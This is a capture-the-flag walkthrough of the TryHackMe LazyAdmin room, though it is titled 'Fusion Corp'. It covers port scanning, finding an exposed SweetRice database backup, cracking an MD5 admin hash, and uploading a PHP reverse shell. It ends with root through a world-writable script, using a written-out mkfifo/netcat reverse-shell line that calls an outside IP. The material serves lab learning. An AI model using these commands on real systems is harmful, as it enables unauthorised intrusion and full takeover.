## TryHackMe: Fusion Corp
Welcome to my writeup for the LazyAdmin room on TryHackMe. Rated as an easy machine, LazyAdmin provides a great learning ground for beginners to practice the fundamentals of penetration testing, including directory brute-forcing, exploiting known CMS vulnerabilities, and leveraging poorly secured cron jobs or scripts for privilege escalation. In this guide, I’ll walk you through my entire methodology, from initial enumeration to pulling the final root flag. (Note- This lab may crash in-between multiple times so reset everytime your ping doesn't reach the target)

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali instance (highly recommended)

##  1.🔍 Initial Reconnaissance (Port Scanning)
Every successful penetration test starts with reconnaissance. We need to find out what doors (ports) are open on the target machine and what services are running behind them so we can look for potential entry points. 

Before initiating the enumeration phase, let's export the target IP address as an environment variable for easier reference throughout the lab: `export target=<TARGET_IP>`

Then, we use the following **Nmap** command:
```
nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m $target --open
```

Here is exactly what each flag does:

* **`-p-`**: Scans **all 65,535 ports** instead of just the top 1,000 default ports. Backdoors or uncommon services love to hide on higher ports.
* **`-Pn`**: Treats the host as online and skips the initial ping discovery. This is crucial because many Windows targets disable ICMP (ping) by default, which can cause Nmap to falsely report that the machine is down.
* **`-A`**: This is the "Aggressive" scan flag. It enables **OS detection**, **version scanning** (to see what software version is running on a port), and runs **default NSE scripts** to find basic vulnerabilities.
* **`--min-rate 2000`**: Forces Nmap to send packets at a minimum rate of 2,000 packets per second. This drastically speeds up the scan.
* **`--initial-rtt-timeout 50ms` / `--max-rtt-timeout 150ms`**: Controls how long Nmap waits for a response to a packet. By capping it at 150ms, we ensure Nmap doesn't hang forever on a slow or dropped packet.
* **`--max-retries 1`**: If a port doesn't respond, Nmap will only try to probe it one more time before moving on. This keeps the scan fast.
* **`--stats-every 1m`**: Prints a status update in your terminal every 1 minute so you know the scan hasn't frozen.
* **`--open`**: Efficient filter used to only show ports that are actively listening and accepting connections.

 ⚠️ **Beginner Tip:** While these speed optimizations (`--min-rate`, aggressive timeouts) are perfect for CTFs like TryHackMe, they can be very noisy and disruptive in real-world professional engagements. In a real pentest, this could trigger firewalls, alert blue teams, or crash fragile services!

 _Figure 1: Nmap Scan Result_

 <img width="1247" height="535" alt="image-310" src="https://github.com/user-attachments/assets/29af237c-14a3-4e3f-a43d-8a7ad1a0d54a" />

## 2.🧩 Analyzing the Scan Results
When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask:

"What is this server's primary job, and how can I use this information?"

The Big Picture: What is this machine?
As a beginner, instead of looking at these ports as random numbers, you should group them by their functional relationships:

When you look past the raw TCP/IP fingerprint data, the scan tells a very simple story. We only have two open ports to worry about, and we can group them by their function to decide our next move:

    Port 22 (SSH - OpenSSH 7.2p2): This handles secure remote administration. In the early stages of a machine like this, it is rarely the initial entry point. We keep this in our back pocket in case we find leaked credentials or private keys later.

    Port 80 (HTTP - Apache httpd 2.4.18): This is our primary attack vector. It is a standard web server, and it is almost certainly where the "Lazy Admin" left the door cracked open.

🔍 Key Takeaways from the Footprint

    It's a Linux Environment: The service versions explicitly point to an Ubuntu-based system. Knowing we are dealing with a Linux environment helps us narrow down our payload choices later.

    The Web Server is the Front Door: Because port 22 is usually hardened, our entire initial phase must focus on port 80. A web application is much more likely to have misconfigurations, outdated plugins, or exposed backup files.

    Software Era: The versions of Apache and OpenSSH suggest this is an older system (likely Ubuntu 16.04). While there might be OS-level exploits, we always prioritize looking for "low-hanging fruit" in the web application layer before attempting to exploit the underlying OS.

	🚀 Next Logical Steps

## 3. Explore Web Server 

### 1- Manual Inspection: 
Open a browser and visit http://10.113.174.158. Sometimes, just reading the text on the homepage reveals the directory structure or the software being used.

_Figure 2: Webpage_

<img width="1237" height="711" alt="image-311" src="https://github.com/user-attachments/assets/8c1f2e6d-ec09-4d3a-b034-38c970d8dcdc" />

### 2- Directory Brute-Forcing
We need to find hidden files or administrative portals that aren't linked on the main page. Using a tool like ffuf, Gobuster or Feroxbuster to scan for common directories (like /admin, /backup, or /config) is the standard next step. Difference between the 3 tools:

#### 1. Gobuster: The Reliable Workhorse

    How it works: Built in Go, it focuses on straightforward directory and DNS brute-forcing.

    The Vibe: No-nonsense, predictable, and extremely clean output.

    Best for: Standard, straightforward CTF boxes like LazyAdmin. If you just need to know if /admin or /backup exists without any complex filtering or advanced parameters, Gobuster is your quickest option.

#### 2. ffuf (Fuzz Faster U Fool): The Swiss Army Knife

    How it works: A highly customizable web fuzzer. It doesn't just look for directories; it can fuzz parameters, subdomains, HTTP headers, and POST data.

    The Vibe: Speed and extreme flexibility. You use the word FUZZ anywhere in your request command, and ffuf replaces it with your wordlist.

    Best for: Real-world penetration testing and advanced web application hacking. If a web server returns weird response sizes or you need to bypass a custom firewall by filtering out specific word counts or status codes, ffuf is unmatched.
	
#### 3. Feroxbuster: The Recursive Speed Demon

    How it works: Written in Rust, it is designed to be blazingly fast. Its defining feature is automatic recursion—if it finds a folder named /images, it will automatically start a brand new scan inside /images without making you run a second command.

    The Vibe: Modern, aggressive, and hands-off.

    Best for: Deep, large-scale web enumeration where you want to map out entire nested directory trees completely unsupervised.


#### 📂 Web Directory Enumeration with Feroxbuster
We'll use Feroxbuster to brute-force hidden directories to map out the complete directory tree.
```
feroxbuster -u http://10.113.174.158 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html
```

⚙️ Command Breakdown:

    -u [http://10.113.174.158](http://10.113.174.158): Specifies our target URL (the IP from our Nmap scan).

    -w /usr/share/seclists/.../common.txt: The wordlist containing thousands of common directory and file names.

    -x php,txt,html: Tells Feroxbuster to check for specific file extensions alongside directories.

_Figure 3: Feroxbuster_

<img width="1243" height="682" alt="image-312" src="https://github.com/user-attachments/assets/910fe300-00c1-4981-9586-13b65b1bce9d" />

Thanks to Feroxbuster’s automatic recursion, it didn't just find top-level folders; it systematically mapped the entire file structure of the web application.

#### 🔍 Decoding the Critical Hits
Looking through the terminal output, several massive findings completely give away what this application is and where the vulnerabilities lie:

##### 1. The Core CMS Revealed: SweetRice

    http://10.113.174.158/content/js/SweetRice.js

    http://10.113.174.158/content/images/sweetrice.png

The target is running SweetRice, an open-source PHP Content Management System (CMS). Knowing the exact software name gives us a target to look up on Exploit-DB or search using searchsploit.

##### 2. The Jackpot: Exposed Database Backups

    http://10.113.174.158/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql

This is a catastrophic misconfiguration by our "Lazy Admin." The directory listing revealed an archived .sql file. Database backups frequently contain hardcoded administrative credentials, configuration details, or password hashes. This will be our highest priority target for investigation.

##### 3. The Login Portal

    http://10.113.174.158/content/as/index.php

The /as/ directory appears to house the administrator dashboard (as likely stands for Admin System or Admin Suite in this specific CMS framework). If we can extract a password or hash from that .sql backup file, this login page is exactly where we will try to use it.

## 3. 🧭 Looting the Configuration & Initial Access
We will download the database backup file directly to our attacking machine to inspect its contents for sensitive information:
Navigating directly to http://10.113.174.158/content/inc/mysql_backup/ confirms that Directory Listing is actively enabled, giving us full access to the underlying backup files.

_Figure 4: sql backup content_

<img width="1282" height="717" alt="image-313" src="https://github.com/user-attachments/assets/80f67cef-0400-442b-8202-3257dad170aa" />

If you peer closely into the serialized PHP data on line 79, you can pick out the specific keys indicating username and password fields:

    "manager": The designated username role found inside the configuration string.

    "passwd": The field containing a 32-character hexadecimal string, indicating a standard MD5 hash:
    42f749ade7f9e195bf475f37a44cafcb


#### ⚡ Cracking the MD5 Hash
Because MD5 is an obsolete, fast cryptographic hash function lacking a salt by default in this implementation, it is highly vulnerable to offline dictionary matching and precomputed rainbow tables. We can pass this hash straight into an online cracker, or crack it instantly locally using hashcat with the standard rockyou.txt wordlist:
```
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
hashcat -m 0 hash.txt /home/kali/rockyou.txt
```

_Figure 5: Hash Cracked_

<img width="1065" height="596" alt="image-314" src="https://github.com/user-attachments/assets/24c9f483-892f-4e4f-9e3f-165702c3363e" />

The hash completely unravels within seconds:

    Username: manager

    Password: Password123


#### 🚀 Next Step: Accessing the Admin Panel
Now that we have successfully bypassed the database confidentiality block and recovered cleartext credentials, it is time to pivot back to the administration portal we discovered during the directory brute-forcing phase.

We will head directly over to the login page at:
`http://10.112.173.64/content/as/index.php`

_Figure 6: Login_

<img width="847" height="671" alt="image-315" src="https://github.com/user-attachments/assets/130c6d5f-f3cc-4afc-a552-7653727c8a2e" />

_Figure 7: Panel Accessed_

<img width="859" height="636" alt="image-316" src="https://github.com/user-attachments/assets/2a9006ad-c6da-4059-bfb8-1024f74aef81" />

We see the Ads section on the left where we can insert our php reverse shell code downloaded from - https://pentestmonkey.net/tools/web-shells/php-reverse-shell (others didn't work) after modifying our VM IP and port number.

_Figure 8: Injecting Ads Panel_

<img width="1269" height="651" alt="image-319" src="https://github.com/user-attachments/assets/081371c5-c5d9-4e1d-8815-ecb73ccada06" />

We can then activate the reverse shell by going to http://<remote-ip/content/inc/ads/<shell_name>, but first we need to setup a netcat listener by using the bash command:
```
nc -lvnp port-number
```
This gives the reverse shell something to connect back to.

Head over to the URL for your shell to activate it, then look back at netcat:
```
http://10.112.173.64/content/inc/ads/
```

_Figure 9: Activating Reverse Shell_

<img width="1267" height="394" alt="image-320" src="https://github.com/user-attachments/assets/33b30122-cd13-4b7c-b4f5-2276d4aeda0e" />

_Figure 10: Shell Received_

<img width="614" height="202" alt="image-321" src="https://github.com/user-attachments/assets/22d7301c-ea27-422a-b6ae-1fb3eb394ed8" />

### Stabilize the shell:

#### Step 1: Use Python to spawn an interactive bash shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Step 2: Background the shell session to adjust terminal settings
```
Ctrl + Z
```

#### Step 3: Configure your local terminal to pass raw characters through unchanged
```
stty raw -echo; fg
```

#### Step 4: Re-initialize the shell environment variables inside the new terminal
```
export TERM=xterm
```

_Figure 11: Stabilized the Shell_

<img width="615" height="386" alt="image-322" src="https://github.com/user-attachments/assets/6e43fb9b-a9a3-4b7d-8a96-ec551657ef3a" />

With a stable TTY shell established, we immediately check for basic misconfigurations or quick wins by running sudo -l. This command lists the allowed commands that our current user (www-data) can run with administrative privileges.

#### 🔍 Deconstructing the Permission
This output is a critical finding. It tells us that:

    Who: The user www-data can execute a specific command.

    As Whom: (ALL) means it can be run as any user, including root.

    The Condition: NOPASSWD means the system will not prompt us for a password when executing this specific command string.

    The Command: /usr/bin/perl /home/itguy/backup.pl

This means if we execute that exact Perl script using sudo, it will run with root authority.

#### 📂 Enumerating the Backup Script
Before we try to run or abuse this, we need to inspect what /home/itguy/backup.pl actually does and check our permissions on the file itself. We can check the file details by running:
```
ls -l /home/itguy/backup.pl
```

_Figure 12: Enumerating Script_

<img width="612" height="99" alt="image-323" src="https://github.com/user-attachments/assets/fdc321a6-685f-491b-9f3f-9f3f31426e85" />

This is where the room truly earns its name. We cannot modify the Perl script itself because it is owned by root and is read/execute-only (-rw-r--r-x) to us. However, looking at the source code reveals a classic security flaw: nested execution. The Perl script simply triggers a system command to execute a secondary shell script located at /etc/copy.sh.

#### 🕵️‍♂️ Pulling the Thread: Analyzing the Script Chain

    We can run /home/itguy/backup.pl as root using sudo.

    We cannot modify backup.pl directly because only root has write permissions (-rw-r--r-x).

    However, backup.pl unconditionally calls a bash shell script: /etc/copy.sh.

This means if www-data has write permissions to /etc/copy.sh, we don't need to touch the Perl script at all. We can just modify the contents of copy.sh to include a payload. When we run the Perl script with sudo, it will call our modified copy.sh script and execute our payload with full root authority.

### 📂 Checking /etc/copy.sh Permissions
Our next immediate step is to inspect the permissions of this secondary script to see if the "Lazy Admin" left it world-writable:
```
ls -l /etc/copy.sh
```

_Figure 13: Check permissions for copy.sh_

<img width="437" height="49" alt="image-324" src="https://github.com/user-attachments/assets/7c9ec3bc-3e3c-4ce8-80e3-94094fb0e498" />

<ins>Checking the permissions of /etc/copy.sh confirms the critical security vulnerability:</ins>
Because the file is world-writable, we can append a malicious command to it.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.128.152 9001 >/tmp/f" >> /etc/copy.sh
```

### 👑 Triggering the Root Shell
With our payload successfully staged inside /etc/copy.sh, we set up a second Netcat listener on our attacking machine using port 9001:
```
nc -lvnp 9001
```

Now, we execute the root-privileged Perl script using sudo. Because sudo -l granted us NOPASSWD rights for this specific execution chain, the system will run it immediately as root without asking for a password:
```
sudo /usr/bin/perl /home/itguy/backup.pl
```

_Figure 14: Shell Connected_

<img width="622" height="84" alt="image-326" src="https://github.com/user-attachments/assets/119a529d-a738-4393-bca4-55a881d62a8d" />

With the incoming connection caught on our Netcat listener, we verify our identity using the id command. The terminal confirms our absolute control over the machine:
```
uid=0(root) gid=0(root) groups=0(root)
```

<ins>Now that we have full administrative privileges, we can seamlessly harvest the user and root flags to complete the TryHackMe challenge.</ins>

_Figure 15: Flags Captured_

<img width="403" height="137" alt="image-328" src="https://github.com/user-attachments/assets/6bdca177-2c57-44dd-91ce-659a1e9efa72" />

